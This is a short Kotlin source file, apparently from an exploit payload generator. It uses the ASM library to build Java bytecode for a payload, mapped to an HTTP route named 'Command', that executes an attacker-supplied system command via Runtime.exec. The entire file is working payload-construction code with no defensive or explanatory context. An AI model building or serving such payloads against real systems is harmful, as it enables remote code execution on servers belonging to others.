package http.payloads

import org.objectweb.asm.Label
import org.objectweb.asm.MethodVisitor
import org.objectweb.asm.Opcodes

/**
 * execute system command
 */
@HTTPMapping(["Command"])
class Command(mv: MethodVisitor) : MethodVisitor(Opcodes.ASM7, mv) {
    override fun visitCode() {
        val label0 = Label()
        val label1 = Label()
        val label2 = Label()
        mv.run {
            visitTryCatchBlock(label0, label1, label2, "java/lang/Exception")
            visitLabel(label0)
            visitLdcInsn(Options.command)
            visitVarInsn(Opcodes.ASTORE, 0)
            visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false)
            visitVarInsn(Opcodes.ALOAD, 0)
            visitMethodInsn(
                Opcodes.INVOKEVIRTUAL,
                "java/lang/Runtime",
                "exec",
                "(Ljava/lang/String;)Ljava/lang/Process;",
                false
            )
            visitInsn(Opcodes.POP)
            visitLabel(label1)
        }
        val label3 = Label()
        mv.run {
            visitJumpInsn(Opcodes.GOTO, label3)
            visitLabel(label2)
            visitVarInsn(Opcodes.ASTORE, 0)
            visitVarInsn(Opcodes.ALOAD, 0)
            visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Exception", "printStackTrace", "()V", false)
            visitLabel(label3)
        }
    }
}
